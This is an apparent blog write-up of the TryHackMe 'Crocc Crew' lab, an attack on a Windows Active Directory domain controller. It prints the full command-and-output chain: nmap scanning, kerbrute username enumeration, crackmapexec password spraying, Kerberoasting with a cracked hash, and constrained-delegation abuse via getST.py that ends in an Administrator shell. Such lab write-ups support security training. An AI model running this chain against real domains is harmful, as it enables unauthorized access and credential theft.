<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="blog @ zexion.dev" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="blog @ zexion.dev" /> <title> Crocc Crew - Try Hack Me - blog @ zexion.dev </title> <link rel="alternate" href="http://localhost:4000/CrocCrew/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/CrocCrew/" /> <meta name="description" content="Insane rated machine from Try Hack Me" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Crocc Crew - Try Hack Me | zexionx00" /> <meta property="og:title" content="Crocc Crew - Try Hack Me | zexionx00" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/CrocCrew/" /> <meta property="og:description" content="Insane rated machine from Try Hack Me" /> <meta property="og:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Crocc Crew - Try Hack Me | zexionx00" /> <meta name="twitter:url" content="http://localhost:4000/CrocCrew/" /> <meta name="twitter:site" content="@zexionx00" /> <meta name="twitter:creator" content="@zexionx00" /> <meta name="twitter:description" content="Insane rated machine from Try Hack Me" /> <meta name="twitter:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="blog @ zexion.dev" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#thm">THM</a> </span> </div> <h1 class="header-title" itemprop="headline">Crocc Crew - Try Hack Me</h1> <div class="post-meta"> <time datetime="2022-01-31T00:00:07+00:00" itemprop="datePublished"> Jan 31, 2022 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">zexionx00</span> </span> <time hidden datetime="" itemprop="dateModified"> Jan 31, 2022 </time> <span hidden itemprop="publisher" itemtype="Person">zexionx00</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><figure> <img src="/assets/img/crew/crew.png" alt="Crew" /> <figcaption> Crocc Crew - Try Hack Me </figcaption> </figure> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <figure> <img src="/assets/img/crew/crew.png" alt="Crew" /> <figcaption> Crocc Crew - Try Hack Me </figcaption> </figure> <h1 id="nmap"> <a href="#nmap" class="anchor-head"></a> Nmap </h1> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Mon Jan 31 22:05:47 2022 as: nmap -sC -sV -vv -oA nmap/ports 10.10.44.104</span>
Nmap scan report <span class="k">for </span>10.10.44.104
Host is up, received echo-reply ttl 127 <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-31 22:05:48 EST <span class="k">for </span>114s
Not shown: 987 filtered ports
Reason: 987 no-responses
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2022-02-01 03:06:09Z<span class="o">)</span>
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: COOCTUS.CORP0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: COOCTUS.CORP0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-01T03:06:32+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.COOCTUS.CORP
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC.COOCTUS.CORP
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-31T03:04:22
| Not valid after:  2022-08-02T03:04:22
| MD5:   564b 338c fbbd f75d 11ea a15c 5686 6060
| SHA-1: c8fc f30e 63b2 b68d 27bb b307 4308 a0d4 d02b fa54
| <span class="nt">-----BEGIN</span> CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQMpmK6rtiFYFFYvOcxCBihTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjIwMTMxMDMwNDIyWhcNMjIw
| ODAyMDMwNDIyWjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCbiJRU8mMoBBNN2qTljJqQs6KLy57Z3mnh
| +foiHxAhWHgu/oe1U4syQawsyu6Wc55hlMTvTx2vzYM2VhSswl+R2r9dMSr0kp3E
| dyXrtsI37dewAim8bonvcHprn3X/AbSoej5ayLH83Hghs0vSSr21JSoNR79oVb9V
| paVlWI4G0pnenDUeFFX5a38x+e075ivKu5r3tIfe3ousFWbh8vAe41drmVWhdk9P
| 2WueQ+gMayXym6vnhMolg6ALM7/Si697sShSPK2gxq+lStwrQVkhQBJsB3vpoapn
| GgqXgSA3ImxaxIQTvJGpVboV6wW8PaHBkeAKi41byRtYnTgAA/GNAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAL5l4FBRgDo1JKPy2vP9mhsO6M69BrOH42mDId3e/cZiWOBGI80UC3KKc
| kJxkKKhez1jHRyfL1G2SQffJhmzOGyFaBrk38BkBblq3XHL0Co9ry0Th7ZvTXy2n
| JSQog+ezRqTfs9aRkwRYO8hT5t3vM4k1H+FB/aTetAjUlvTcKaSlBenoad+Kqif6
| +98BWZxwwQqJj62RbO7A32poXuc7OFWe6ZNk3Z+x+uEqBQwhxoR5H9FjnyXW+/GO
| UG6v+Qln6Lax8YzszPah09T/RzjXge6RsF8TbCBb9S2fDpT1dvFsMUEe0uTuLSWo
| w6I4mlDec+7fx6xqVV/yyNTvMT4oYg<span class="o">==</span>
|_-----END CERTIFICATE-----
|_ssl-date: 2022-02-01T03:07:33+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-1s</span>, deviation: 0s, median: <span class="nt">-1s</span>
| p2p-conficker: 
|   Checking <span class="k">for </span>Conficker.C or higher...
|   Check 1 <span class="o">(</span>port 4473/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 2 <span class="o">(</span>port 59461/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 3 <span class="o">(</span>port 33391/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 4 <span class="o">(</span>port 38295/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2022-02-01T03:06:35
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon Jan 31 22:07:42 2022 -- 1 IP address (1 host up) scanned in 115.27 seconds</span>
</code></pre></div></div> <p>Nmap shows domain, add it to hosts file and move on.</p> <h1 id="web"> <a href="#web" class="anchor-head"></a> Web </h1> <p>We can some usernames from web in which three of the usernames are valid.</p> <figure> <img src="/assets/img/crew/users.png" alt="Users" /> <figcaption> Users </figcaption> </figure> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% kerbrute userenum <span class="nt">-d</span> cooctus.corp <span class="nb">users</span> <span class="nt">--dc</span> 10.10.44.104

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/31/22 - Ronnie Flathers @ropnop

2022/01/31 22:31:16 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2022/01/31 22:31:16 <span class="o">&gt;</span>   10.10.44.104:88

2022/01/31 22:31:16 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       varg@cooctus.corp
2022/01/31 22:31:16 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       cryillic@cooctus.corp
2022/01/31 22:31:16 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       fawaz@cooctus.corp
</code></pre></div></div> <p>But none of the user has preauth set.</p> <h1 id="cme"> <a href="#cme" class="anchor-head"></a> CME </h1> <p>Trying to bruteforce the password for those users, we immediately get a hit on cryillic with qwerty.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% crackmapexec smb cooctus.corp <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-p</span> /usr/share/wordlists/rockyou.txt 
SMB         cooctus.corp    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:COOCTUS.CORP<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:123456 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:12345 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:123456789 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:password STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:iloveyou STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:princess STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:1234567 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:rockyou STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:12345678 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:abc123 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:nicole STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:daniel STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:babygirl STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:monkey STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:lovely STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:jessica STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:654321 STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:michael STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>-] COOCTUS.CORP<span class="se">\c</span>ryillic:ashley STATUS_LOGON_FAILURE 
SMB         cooctus.corp    445    DC               <span class="o">[</span>+] COOCTUS.CORP<span class="se">\c</span>ryillic:qwerty 
</code></pre></div></div> <h1 id="kerberoast"> <a href="#kerberoast" class="anchor-head"></a> Kerberoast </h1> <p>Kerberoasting with those creds, we get a new account called password-reset with password resetpassword. Finding more about the account with impacket’s finddelegation, we can see that our account is configured with constrained delegations which makes us able to request ticket of users.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% crackmapexec ldap cooctus.corp <span class="nt">-u</span> cryillic <span class="nt">-p</span> qwerty <span class="nt">--kerberoasting</span> <span class="nb">hash                 
</span>SMB         cooctus.corp    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:COOCTUS.CORP<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        cooctus.corp    389    DC               <span class="o">[</span>+] COOCTUS.CORP<span class="se">\c</span>ryillic:qwerty 
LDAP        cooctus.corp    389    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total of records returned 4                                                                                                           
LDAP        cooctus.corp    389    DC               sAMAccountName: password-reset memberOf:  pwdLastSet: 2021-06-08 18:00:39.356663 lastLogon:2021-06-08 17:46:23.369540
LDAP        cooctus.corp    389    DC               <span class="nv">$krb5tgs$23$*</span>password-reset<span class="nv">$COOCTUS</span>.CORP<span class="nv">$HTTP</span>/dc.cooctus.corp<span class="k">*</span><span class="nv">$33e57f3d810ba61d230ff836aa9e57b6$a683b48c5d77403b702988b4507e22649f130dadb1</span>
a119f52025cd6465db7a94f3d57b40d6e14882b4da838c551f9e9314221657e9d4fc5ee48bdcc00a820dad46c5181e6bb46a4c73940fc8214e7a94b22c85200b0c74f17b77572b2798387aa846708842f79e52a79bac518c3f2f4a6495d378
14f5765815f64d0bff6a4f0e69be05e03ef12c2b7fca6dbeff5dc1d1610b5e9354ad4f1f2fe460668069a5b54766ae168b0c429a09fa2c4cb5e0b34541e46c93287cca549842bb38dda20489fc9843274a3a8d366a54d0e6f6f23e381b6234
14263b31391649e9f958c7e8dfd0ace55e359e83c50899816d86c2ed70721c688eb4fb79af1743424b6dc2a2b3e38d61280b43779c100d4ccf67cd5190ed75bfdbc00e02a2e15801129d3777ee11e3690f07c1f5e526817967dd62cb2f055e
bfde7162f2e93193d3f72ba94ec097cc6720d4efcc4ddc3678763d25a1ad8ceba1d078eb670e3c97d118f59c2f4f372b2f4a1839df64e3bd474d369416e66e195bdf32257356f7c58492c98000bb4b204bc44759e5486d5d97f95ea52bdbfb
00c98ec08763c3d5b5d6dc70bfd0094f4eb6bd0540dcde3f81f4b9f845b896a975d8aa69f25ca04fe84d3d34cba8c095496f3fa4d75272ab903402d8346d7f0ecbac4b43b690cc796737a08bc1f54371f8fb58fc79682d451de0a8f5c0055f
3970b9621cb4a9a17734548441379a687ac6238e182a17d17305b82bfa1c18866a89f597f30c0287a6853bbbdd58fb52a21d5dfeee01217663d7732d684012c71fee8f1f72783797bbb7956ade3d1f97af987012dab72398f92379ec60610a
3b152afaf81fc9f0b4197aaa7920aaa9a4b899bfd2ee2f73a9924c2d3667f6eae7db2bdbe994494fc465e6747fbf0537014c6f9159c7d9cb755ad33e26161c9894b430b46ce225a86dfcc743aa04d9d28d650c890e0aab91a3a72bc8bf51ae
64293dcfc7dd4e332a9ffdae882fdab32f34f5247e3eb07c7d8694b49da9e7fd846ab1ee319ef45669e5a2f17254aa0af3da0be087a7d2cd44f422fcbb3744b425e4a9598c71d10db81003065a247aade136deb6fa845fa5ef161a4e68ec1b
79d2cbde2c5ed9ffbaa2447ce9c7faf6391285ee5d00a8b1fa0593ec1b51ace55b21dd92f7284b1bfeb507e6e3878e072c1616436a524cb3cd927cf17a55a48a911f595710693f34869ae9b25c8d12b1ef3ec4b803a611efcb8b61b0e1a8af
abbf18f6314fdd4ca32badc09a76936109582a388d4f4a0dc7a38a7d15d09974c15a94fcd901028308478358721697d091353345d254ef514b60849de4dd4725920f12c00442a7ea0b4be72515936837b704aa8aa1de3aa921d43677cbd58<span class="err">$</span>
b8a252c2a037821bc26fba82cb4e9e3c1510
LDAP        cooctus.corp    389    DC               <span class="o">[</span>-] Error with the LDAP account used
% john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash                                     
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
resetpassword    <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2022-01-31 22:39<span class="o">)</span> 2.500g/s 591360p/s 591360c/s 591360C/s rikelme..pink panther
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div> <h1 id="finddelegationpy"> <a href="#finddelegationpy" class="anchor-head"></a> findDelegation.py </h1> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-findDelegation <span class="nt">-debug</span> cooctus.corp/<span class="s1">'password-reset:resetpassword'</span> <span class="nt">-dc-ip</span> 10.10.44.104                                                                                          
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                       
                                                                                                                                                                                              
<span class="o">[</span>+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket                                                                                                       
<span class="o">[</span>+] Connecting to 10.10.44.104, port 389, SSL False
<span class="o">[</span>+] Total of records returned 4
AccountName     AccountType  DelegationType                      DelegationRightsTo                   
<span class="nt">--------------</span>  <span class="nt">-----------</span>  <span class="nt">----------------------------------</span>  <span class="nt">-----------------------------------</span>
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP 
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP               
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                            
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS       
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS                    
</code></pre></div></div> <h1 id="getstpy"> <a href="#getstpy" class="anchor-head"></a> getST.py </h1> <p>And we get a ticket of Administrator.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>% getST.py <span class="nt">-spn</span> oakley/DC.COOCTUS.CORP <span class="nt">-impersonate</span> Administrator <span class="s1">'cooctus.corp/password-reset:resetpassword'</span> <span class="nt">-dc-ip</span> 10.10.44.104
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache

% <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache 

% wmiexec.py cooctus.corp/Administrator@dc.cooctus.corp <span class="nt">-k</span> <span class="nt">-no-pass</span>
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
C:<span class="se">\&gt;</span><span class="nb">whoami
</span>cooctus<span class="se">\a</span>dministrator

C:<span class="se">\&gt;</span>
</code></pre></div></div> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/VulnetActive/" > <div class="nav-arrow">Previous</div> <span class="post-title">Vulnet Active - Try Hack Me</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/thanks">ack.</a> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2022</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
